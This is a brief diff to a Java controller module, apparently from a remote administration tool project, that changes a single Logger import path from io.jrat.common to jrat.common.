@@ -1,7 +1,7 @@
 package jrat.controller.modules;
 
 import apiv2.ControllerModule;
-import io.jrat.common.Logger;
+import jrat.common.Logger;
 import jrat.controller.AbstractSlave;
 
 import java.io.ByteArrayOutputStream;
